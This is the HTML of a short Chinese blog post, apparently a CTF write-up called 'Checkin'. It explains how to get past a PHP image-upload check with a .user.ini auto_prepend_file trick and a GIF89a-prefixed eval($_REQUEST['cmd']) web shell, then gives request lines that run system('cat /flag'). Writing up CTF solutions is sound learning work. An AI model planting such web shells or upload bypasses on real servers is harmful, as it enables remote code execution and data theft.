@@ -1,0 +1,329 @@
+<!DOCTYPE html>
+<html itemscope itemtype="http://schema.org/WebPage" lang="en">
+  <head>
+    
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+    <meta name="robots" content="noodp" />
+    <title>Checkin - ReaL One</title><meta name="author" content="RockBear">
+<meta name="author-link" content="">
+<meta name="description" content="1常规步骤之后，上传了.htaccess文件，不过发现被限制了。
+返回了一个：
+1 2 exif_imagetype:not image! exif_imagetype函数
+简单来说就是，上传文件白名单机制。
+QAQ
+新英雄登场
+.user.ini文件
+php目录配置文件，作用为：
+当我们访问目录中的任何php文件时，都会调用.user.ini中指的文件以php的形式进行读取。
+文件内容为
+1 2 3 4 GIF89a auto_prepend_file=po.jpg 之后就可以常规步骤一顿操作。
+2这里也有了新一种方法用传进去的cmd 进行rce——其前提是传入的木马文件内容为：
+1 2 3 4 GIF89a &lt;script language=&#39;php&#39;&gt;eval($_REQUEST[&#39;cmd&#39;]);&lt;/script&gt; 然后
+1 2 3 4 5 6 7 8 9 10 uploads/xxx/index.php?cmd=var_dump(scandir(&#34;/&#34;)); // 扫描当前目录下的文件，并打印出来 uploads/xxx/index.php?cmd=system(&#39;cat /flag&#39;); uploads/xxx/index.php?cmd=var_dump(file_get_contents(&#34;/flag&#34;)); 3ps：图片文件头前缀（作用是？）
+1 2 3 4 5 6 7 8 JPG:FF D8 FF E0 00 10 4A 46 49 46（16进制编码） GIF：47 49 46 38 39 61（ascll值是GIF89a） PNG： 89 50 4E 47 参考一下" /><meta name="keywords" content='PHP, RCE' /><meta itemprop="name" content="Checkin">
+<meta itemprop="description" content="1常规步骤之后，上传了.htaccess文件，不过发现被限制了。
+返回了一个：
+1 2 exif_imagetype:not image! exif_imagetype函数
+简单来说就是，上传文件白名单机制。
+QAQ
+新英雄登场
+.user.ini文件
+php目录配置文件，作用为：
+当我们访问目录中的任何php文件时，都会调用.user.ini中指的文件以php的形式进行读取。
+文件内容为
+1 2 3 4 GIF89a auto_prepend_file=po.jpg 之后就可以常规步骤一顿操作。
+2这里也有了新一种方法用传进去的cmd 进行rce——其前提是传入的木马文件内容为：
+1 2 3 4 GIF89a &lt;script language=&#39;php&#39;&gt;eval($_REQUEST[&#39;cmd&#39;]);&lt;/script&gt; 然后
+1 2 3 4 5 6 7 8 9 10 uploads/xxx/index.php?cmd=var_dump(scandir(&#34;/&#34;)); // 扫描当前目录下的文件，并打印出来 uploads/xxx/index.php?cmd=system(&#39;cat /flag&#39;); uploads/xxx/index.php?cmd=var_dump(file_get_contents(&#34;/flag&#34;)); 3ps：图片文件头前缀（作用是？）
+1 2 3 4 5 6 7 8 JPG:FF D8 FF E0 00 10 4A 46 49 46（16进制编码） GIF：47 49 46 38 39 61（ascll值是GIF89a） PNG： 89 50 4E 47 参考一下"><meta itemprop="datePublished" content="2023-10-17T13:06:03+08:00" />
+<meta itemprop="dateModified" content="2023-10-17T13:06:03+08:00" />
+<meta itemprop="wordCount" content="81">
+<meta itemprop="keywords" content="PHP,RCE," /><meta property="og:title" content="Checkin" />
+<meta property="og:description" content="1常规步骤之后，上传了.htaccess文件，不过发现被限制了。
+返回了一个：
+1 2 exif_imagetype:not image! exif_imagetype函数
+简单来说就是，上传文件白名单机制。
+QAQ
+新英雄登场
+.user.ini文件
+php目录配置文件，作用为：
+当我们访问目录中的任何php文件时，都会调用.user.ini中指的文件以php的形式进行读取。
+文件内容为
+1 2 3 4 GIF89a auto_prepend_file=po.jpg 之后就可以常规步骤一顿操作。
+2这里也有了新一种方法用传进去的cmd 进行rce——其前提是传入的木马文件内容为：
+1 2 3 4 GIF89a &lt;script language=&#39;php&#39;&gt;eval($_REQUEST[&#39;cmd&#39;]);&lt;/script&gt; 然后
+1 2 3 4 5 6 7 8 9 10 uploads/xxx/index.php?cmd=var_dump(scandir(&#34;/&#34;)); // 扫描当前目录下的文件，并打印出来 uploads/xxx/index.php?cmd=system(&#39;cat /flag&#39;); uploads/xxx/index.php?cmd=var_dump(file_get_contents(&#34;/flag&#34;)); 3ps：图片文件头前缀（作用是？）
+1 2 3 4 5 6 7 8 JPG:FF D8 FF E0 00 10 4A 46 49 46（16进制编码） GIF：47 49 46 38 39 61（ascll值是GIF89a） PNG： 89 50 4E 47 参考一下" />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://66lueflam144.github.io/posts/b92f36b/" /><meta property="article:section" content="posts" />
+<meta property="article:published_time" content="2023-10-17T13:06:03+08:00" />
+<meta property="article:modified_time" content="2023-10-17T13:06:03+08:00" />
+
+<meta name="twitter:card" content="summary"/><meta name="twitter:title" content="Checkin"/>
+<meta name="twitter:description" content="1常规步骤之后，上传了.htaccess文件，不过发现被限制了。
+返回了一个：
+1 2 exif_imagetype:not image! exif_imagetype函数
+简单来说就是，上传文件白名单机制。
+QAQ
+新英雄登场
+.user.ini文件
+php目录配置文件，作用为：
+当我们访问目录中的任何php文件时，都会调用.user.ini中指的文件以php的形式进行读取。
+文件内容为
+1 2 3 4 GIF89a auto_prepend_file=po.jpg 之后就可以常规步骤一顿操作。
+2这里也有了新一种方法用传进去的cmd 进行rce——其前提是传入的木马文件内容为：
+1 2 3 4 GIF89a &lt;script language=&#39;php&#39;&gt;eval($_REQUEST[&#39;cmd&#39;]);&lt;/script&gt; 然后
+1 2 3 4 5 6 7 8 9 10 uploads/xxx/index.php?cmd=var_dump(scandir(&#34;/&#34;)); // 扫描当前目录下的文件，并打印出来 uploads/xxx/index.php?cmd=system(&#39;cat /flag&#39;); uploads/xxx/index.php?cmd=var_dump(file_get_contents(&#34;/flag&#34;)); 3ps：图片文件头前缀（作用是？）
+1 2 3 4 5 6 7 8 JPG:FF D8 FF E0 00 10 4A 46 49 46（16进制编码） GIF：47 49 46 38 39 61（ascll值是GIF89a） PNG： 89 50 4E 47 参考一下"/>
+<meta name="application-name" content="R1">
+<meta name="apple-mobile-web-app-title" content="R1"><meta name="theme-color" data-light="#f8f8f8" data-dark="#252627" content="#f8f8f8"><meta name="msapplication-TileColor" content="#da532c"><link rel="shortcut icon" type="image/x-icon" href="/favicon.ico" />
+    <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
+    <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5"><link rel="canonical" href="https://66lueflam144.github.io/posts/b92f36b/" /><link rel="prev" href="https://66lueflam144.github.io/posts/6168dd2/" /><link rel="next" href="https://66lueflam144.github.io/posts/64b97cd/" /><link rel="stylesheet" href="/css/style.min.b2891ee1b6ff200dd9ad67722bcb1f78551624c44cb60d45d5412d56f6f2a15fc8e68c34e781b6dbfa2e6f2a8a2aedee47d747583374da085e667e9d0ef85620.css" integrity="sha512-soke4bb/IA3ZrWdyK8sfeFUWJMRMtg1F1UEtVvbyoV/I5ow054G22/oubyqKKu3uR9dHWDN02gheZn6dDvhWIA=="><link rel="preload" href="/lib/fontawesome-free/all.min.cf780ba5def29277f562835b0b3a9129ce2aca8afc81a294d6a9a7f824a1c5bb81bac00d23d42946884606b7821642b12e17a2e92f424171446db2aea8b8340c.css" integrity="sha512-z3gLpd7yknf1YoNbCzqRKc4qyor8gaKU1qmn+CShxbuBusANI9QpRohGBreCFkKxLhei6S9CQXFEbbKuqLg0DA==" as="style" onload="this.removeAttribute('onload');this.rel='stylesheet'">
+    <noscript><link rel="stylesheet" href="/lib/fontawesome-free/all.min.cf780ba5def29277f562835b0b3a9129ce2aca8afc81a294d6a9a7f824a1c5bb81bac00d23d42946884606b7821642b12e17a2e92f424171446db2aea8b8340c.css" integrity="sha512-z3gLpd7yknf1YoNbCzqRKc4qyor8gaKU1qmn+CShxbuBusANI9QpRohGBreCFkKxLhei6S9CQXFEbbKuqLg0DA=="></noscript><link rel="preload" href="/lib/animate/animate.min.738daa4d2c3fc0f677ff92c1cc3f81c397fb6d2176a31a2eeb011bf88fe5a9e68a57914321f32fbd1a7bef6cb88dc24b2ae1943a96c931d83f053979d1f25803.css" integrity="sha512-c42qTSw/wPZ3/5LBzD+Bw5f7bSF2oxou6wEb+I/lqeaKV5FDIfMvvRp772y4jcJLKuGUOpbJMdg/BTl50fJYAw==" as="style" onload="this.removeAttribute('onload');this.rel='stylesheet'">
+    <noscript><link rel="stylesheet" href="/lib/animate/animate.min.738daa4d2c3fc0f677ff92c1cc3f81c397fb6d2176a31a2eeb011bf88fe5a9e68a57914321f32fbd1a7bef6cb88dc24b2ae1943a96c931d83f053979d1f25803.css" integrity="sha512-c42qTSw/wPZ3/5LBzD+Bw5f7bSF2oxou6wEb+I/lqeaKV5FDIfMvvRp772y4jcJLKuGUOpbJMdg/BTl50fJYAw=="></noscript><script type="application/ld+json">
+  {
+    "@context": "http://schema.org",
+    "@type": "BlogPosting",
+    "headline": "Checkin",
+    "inLanguage": "en",
+    "mainEntityOfPage": {
+      "@type": "WebPage",
+      "@id": "https:\/\/66lueflam144.github.io\/posts\/b92f36b\/"
+    },"genre": "posts","keywords": "PHP, RCE","wordcount":  81 ,
+    "url": "https:\/\/66lueflam144.github.io\/posts\/b92f36b\/","datePublished": "2023-10-17T13:06:03+08:00","dateModified": "2023-10-17T13:06:03+08:00","publisher": {
+      "@type": "Organization",
+      "name": ""},"description": ""
+  }
+  </script></head>
+  <body data-header-desktop="sticky" data-header-mobile="auto"><script>(window.localStorage?.getItem('theme') ? localStorage.getItem('theme') === 'dark' : ('auto' === 'auto' ? window.matchMedia('(prefers-color-scheme: dark)').matches : 'auto' === 'dark')) && document.body.setAttribute('data-theme', 'dark');</script><div class="wrapper" data-page-style="normal"><header class="desktop animate__faster" id="header-desktop">
+  <div class="header-wrapper">
+    <div class="header-title">
+      <a href="/" title="ReaL One"><img loading="lazy" src="https://cdn-icons-png.flaticon.com/512/11737/11737763.png" alt="ReaL One" data-title="ReaL One" class="logo" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/><span class="header-title-text">ReaL x 8 x One </span></a><span class="header-subtitle"></span></div>
+    <nav>
+      <ul class="menu"><li class="menu-item">
+              <a
+                class="menu-link"
+                href="/archives/"
+                
+                
+              ><i class="fa-solid fa-archive fa-fw fa-sm" aria-hidden="true"></i> Archives</a></li><li class="menu-item">
+              <a
+                class="menu-link"
+                href="/categories/"
+                
+                
+              ><i class="fa-solid fa-folder-tree fa-fw fa-sm" aria-hidden="true"></i> Categories</a></li><li class="menu-item">
+              <a
+                class="menu-link"
+                href="/tags/"
+                
+                
+              ><i class="fa-solid fa-tags fa-fw fa-sm" aria-hidden="true"></i> Tags</a></li><li class="menu-item delimiter"></li><li class="menu-item theme-switch" title="Switch Theme">
+          <i class="fa-solid fa-adjust fa-fw" aria-hidden="true"></i>
+        </li></ul>
+    </nav>
+  </div>
+</header><header class="mobile animate__faster" id="header-mobile">
+  <div class="header-container">
+    <div class="header-wrapper">
+      <div class="header-title">
+        <a href="/" title="ReaL One"><img loading="lazy" src="https://cdn-icons-png.flaticon.com/512/11737/11737763.png" alt="https://cdn-icons-png.flaticon.com/512/11737/11737763.png" data-title="https://cdn-icons-png.flaticon.com/512/11737/11737763.png" class="logo" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/><span class="header-title-text">ReaL x 8 x One </span></a><span class="header-subtitle"></span></div>
+      <div class="menu-toggle" id="menu-toggle-mobile">
+        <span></span><span></span><span></span>
+      </div>
+    </div>
+    <nav>
+      <ul class="menu" id="menu-mobile"><li
+              class="menu-item"
+            ><a
+                  class="menu-link"
+                  href="/archives/"
+                  
+                  
+                ><i class="fa-solid fa-archive fa-fw fa-sm" aria-hidden="true"></i> Archives</a></li><li
+              class="menu-item"
+            ><a
+                  class="menu-link"
+                  href="/categories/"
+                  
+                  
+                ><i class="fa-solid fa-folder-tree fa-fw fa-sm" aria-hidden="true"></i> Categories</a></li><li
+              class="menu-item"
+            ><a
+                  class="menu-link"
+                  href="/tags/"
+                  
+                  
+                ><i class="fa-solid fa-tags fa-fw fa-sm" aria-hidden="true"></i> Tags</a></li><li class="menu-item menu-system">
+          <span class="menu-system-item theme-switch" title="Switch Theme"><i class="fa-solid fa-adjust fa-fw" aria-hidden="true"></i></span></li>
+      </ul>
+    </nav>
+  </div>
+</header><main class="container"><aside class="aside-collection animate__animated animate__fadeIn animate__faster" aria-label="Collections"></aside>
+
+  <article class="page single">
+    <div class="header"><h1 class="single-title animate__animated animate__flipInX"><span title="Repost" class="icon-repost"><i class="fa-solid fa-share fa-fw" aria-hidden="true"></i></span><span>Checkin</span>
+      </h1></div><div class="post-meta">
+      <div class="post-meta-line"><span class="post-author"><span class="author"><i class="fa-solid fa-user-circle" aria-hidden="true"></i>
+      Anonymous</span></span><span class="post-included-in">&nbsp;included in <a href="/categories/ctf/" class="post-category" title="Category - CTF"><i class="fa-regular fa-folder fa-fw" aria-hidden="true"></i> CTF</a></span></div><div class="post-meta-line"><span title="published on 2023-10-17 13:06:03"><i class="fa-solid fa-calendar-days fa-fw me-1" aria-hidden="true"></i><time datetime="2023-10-17">2023-10-17</time></span>&nbsp;<span title="81 words"><i class="fa-solid fa-pencil-alt fa-fw me-1" aria-hidden="true"></i>About 100 words</span>&nbsp;<span><i class="fa-regular fa-clock fa-fw me-1" aria-hidden="true"></i>One minute</span>&nbsp;</div>
+    </div><div class="details toc" id="toc-static" data-kept="false">
+        <div class="details-summary toc-title">
+          <span>Contents</span>
+          <span><i class="details-icon fa-solid fa-angle-right" aria-hidden="true"></i></span>
+        </div>
+        <div class="details-content toc-content" id="toc-content-static"><nav id="TableOfContents">
+  <ul>
+    <li><a href="#1">1</a>
+      <ul>
+        <li><a href="#2">2</a></li>
+        <li><a href="#3">3</a></li>
+      </ul>
+    </li>
+  </ul>
+</nav></div>
+      </div><div class="content" id="content"><h2 id="1" class="heading-element">
+  <a href="#1" class="heading-mark"></a>1</h2><p>常规步骤之后，上传了<code>.htaccess</code>文件，不过发现被限制了。</p>
+<p>返回了一个：</p>
+<div class="highlight" id="id-1"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-SQL" data-lang="SQL"><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">exif_imagetype</span><span class="p">:</span><span class="k">not</span><span class="w"> </span><span class="n">image</span><span class="o">!</span></span></span></code></pre></td></tr></table>
+</div>
+</div><!-- more -->
+<p><a href=https://www.php.net/manual/zh/function.exif-imagetype.php>exif_imagetype函数</a></p>
+<p>简单来说就是，上传文件白名单机制。</p>
+<p>QAQ</p>
+<p>新英雄登场</p>
+<p><code>.user.ini</code>文件</p>
+<p>php目录配置文件，作用为：</p>
+<blockquote>
+<p>当我们访问目录中的任何php文件时，都会调用.user.ini中指的文件以php的形式进行读取。</p>
+</blockquote>
+<p>文件内容为</p>
+<div class="highlight" id="id-2"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-ini" data-lang="ini"><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="na">GIF89a</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="na">auto_prepend_file</span><span class="o">=</span><span class="s">po.jpg</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p>之后就可以常规步骤一顿操作。</p>
+<h3 id="2" class="heading-element">
+  <a href="#2" class="heading-mark"></a>2</h3><p>这里也有了新一种方法<code>用传进去的cmd 进行rce</code>——其前提是传入的木马文件内容为：</p>
+<div class="highlight" id="id-3"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">GIF89a
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">&lt;script language=&#39;php&#39;&gt;eval($_REQUEST[&#39;cmd&#39;]);&lt;/script&gt;</span></span></code></pre></td></tr></table>
+</div>
+</div><p>然后</p>
+<div class="highlight" id="id-4"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-cmd" data-lang="cmd"><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">uploads/xxx/index.php?cmd=var_dump(scandir(<span class="s2">&#34;/&#34;</span>)); // 扫描当前目录下的文件，并打印出来
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">  
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">uploads/xxx/index.php?cmd=system(&#39;cat /flag&#39;);
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">  
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">uploads/xxx/index.php?cmd=var_dump(file_get_contents(<span class="s2">&#34;/flag&#34;</span>));</span></span></code></pre></td></tr></table>
+</div>
+</div><hr>
+<h3 id="3" class="heading-element">
+  <a href="#3" class="heading-mark"></a>3</h3><p>ps：图片文件头前缀（作用是？）</p>
+<div class="highlight" id="id-5"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span><span class="lnt">8
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">JPG:FF D8 FF E0 00 10 4A 46 49 46（16进制编码）
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">GIF：47 49 46 38 39 61（ascll值是GIF89a）
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">PNG： 89 50 4E 47
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">  </span></span></code></pre></td></tr></table>
+</div>
+</div><p><a href=https://www.cnblogs.com/zhiliu/p/16825982.html>参考一下</a></p>
+<p><a href=https://www.cnblogs.com/cjjcn/p/13954347.html>常见文件头/尾总结</a></p>
+<p>php解析文件值得关注</p>
+<hr>
+<p>2024：现在看起来好肤浅的笔记……</p>
+</div><div class="post-footer" id="post-footer">
+  <div class="post-info">
+    <div class="post-info-line">
+      <div class="post-info-mod">
+        <span title="Updated on 2023-10-17 13:06:03">Updated on 2023-10-17&nbsp;</span>
+      </div></div><div class="post-info-line">
+        <div class="post-info-md"><span><a href="/posts/b92f36b/index.md" title="Read Markdown" class="link-to-markdown">Read Markdown</a></span></div>
+        <div class="post-info-share">
+          <span><a href="javascript:void(0);" title="Share on Twitter" data-sharer="twitter" data-url="https://66lueflam144.github.io/posts/b92f36b/" data-title="Checkin" data-hashtags="PHP,RCE"><i class="fa-brands fa-twitter fa-fw" aria-hidden="true"></i></a>
+  <a href="javascript:void(0);" title="Share on Facebook" data-sharer="facebook" data-url="https://66lueflam144.github.io/posts/b92f36b/" data-hashtag="PHP"><i class="fa-brands fa-facebook-square fa-fw" aria-hidden="true"></i></a>
+  <a href="javascript:void(0);" title="Share on 微博" data-sharer="weibo" data-url="https://66lueflam144.github.io/posts/b92f36b/" data-title="Checkin"><i class="fa-brands fa-weibo fa-fw" aria-hidden="true"></i></a>
+  </span>
+        </div>
+      </div></div>
+
+  <div class="post-info-more">
+    <section class="post-tags"><i class="fa-solid fa-tags fa-fw me-1" aria-hidden="true"></i><a href="/tags/php/" class="post-tag" title="Tags - PHP">PHP</a><a href="/tags/rce/" class="post-tag" title="Tags - RCE">RCE</a></section>
+    <section>
+      <span><a href="javascript:void(0);" onclick="window.history.back();">Back</a></span>&nbsp;|&nbsp;<span><a href="/">Home</a></span>
+    </section>
+  </div>
+
+  <div class="post-nav"><a href="/posts/6168dd2/" class="post-nav-item" rel="prev" title="2023 Newstar CTF Begin of HTTP"><i class="fa-solid fa-angle-left fa-fw" aria-hidden="true"></i>2023 Newstar CTF Begin of HTTP</a>
+      <a href="/posts/64b97cd/" class="post-nav-item" rel="next" title="文件包含">文件包含<i class="fa-solid fa-angle-right fa-fw" aria-hidden="true"></i></a></div>
+</div>
+</article>
+
+  <aside class="toc" id="toc-auto" aria-label="Contents"><h2 class="toc-title">Contents&nbsp;<i class="toc-icon fa-solid fa-angle-down fa-fw" aria-hidden="true"></i></h2>
+      <div class="toc-content" id="toc-content-auto"></div></aside></main><footer class="footer">
+    <div class="footer-container"><div class="footer-line copyright" itemscope itemtype="http://schema.org/CreativeWork"><i class="fa-regular fa-copyright fa-fw" aria-hidden="true"></i>
+            <span itemprop="copyrightYear">2023 - 2024</span><span class="author" itemprop="copyrightHolder">
+              <a href="/">RockBear</a></span></div></div>
+  </footer></div><div class="widgets"><div class="fixed-buttons animate__faster d-none"><div class="fixed-button back-to-top" role="button" aria-label="Back to Top"><i class="fa-solid fa-arrow-up fa-fw" aria-hidden="true"></i><span class="variant-numeric d-none">0%</span>
+        </div></div><div id="mask"></div><noscript>
+    <div class="noscript-warning">Theme FixIt works best with JavaScript enabled.</div>
+  </noscript>
+</div><link rel="stylesheet" href="/lib/cookieconsent/cookieconsent.min.2d0f7b71a99aaff94e9624ff32a8dc42ce645a0cba433fdc091cf34735027efd1fa2db024c2f591d768f426255f17bbf3d500b7c967b0437b3979956dffa81c6.css" integrity="sha512-LQ97camar/lOliT/MqjcQs5kWgy6Qz/cCRzzRzUCfv0fotsCTC9ZHXaPQmJV8Xu/PVALfJZ7BDezl5lW3/qBxg=="><script src="/lib/sharer/sharer.min.94c73c706d26a452277a104d6857c0cb04e816ad61c4163b4e0a135426a7767211e0a27c952ea85e3df25aec941374e21053db0f9e7822af8a2f9c4a8a93c4e3.js" integrity="sha512-lMc8cG0mpFInehBNaFfAywToFq1hxBY7TgoTVCandnIR4KJ8lS6oXj3yWuyUE3TiEFPbD554Iq+KL5xKipPE4w==" async defer></script><script src="/lib/cookieconsent/cookieconsent.min.c975ea3858dd8c7347d46343fb510ed236efbde6c0069cc6283eba7639d47e22a560c1391c6314247a0269e1380f93d31b662c4897fa770ab2514bd0bd2d2f68.js" integrity="sha512-yXXqOFjdjHNH1GND+1EO0jbvvebABpzGKD66djnUfiKlYME5HGMUJHoCaeE4D5PTG2YsSJf6dwqyUUvQvS0vaA==" defer></script><script>window.config={"code":{"copyTitle":"Copy to clipboard","editLockTitle":"Lock editable code block","editUnLockTitle":"Unlock editable code block","editable":true,"maxShownLines":10},"comment":{"enable":false},"cookieconsent":{"content":{"dismiss":"Got it!","link":"Learn more","message":"This website uses Cookies to improve your experience."},"enable":true,"palette":{"button":{"background":"#f0f0f0"},"popup":{"background":"#1aa3ff"}},"theme":"edgeless"}};</script><script src="/js/theme.min.480ceccd06035274f7db6f0a884b175d0c7ce24d886ebb948e6a79cb98222318cf2b5442bc64ebe49857d4925b27f0dda60e08619e37530ede8b0aa82c86ec5b.js" integrity="sha512-SAzszQYDUnT3228KiEsXXQx84k2IbruUjmp5y5giIxjPK1RCvGTr5JhX1JJbJ/Ddpg4IYZ43Uw7eiwqoLIbsWw==" defer></script></body>
+</html>
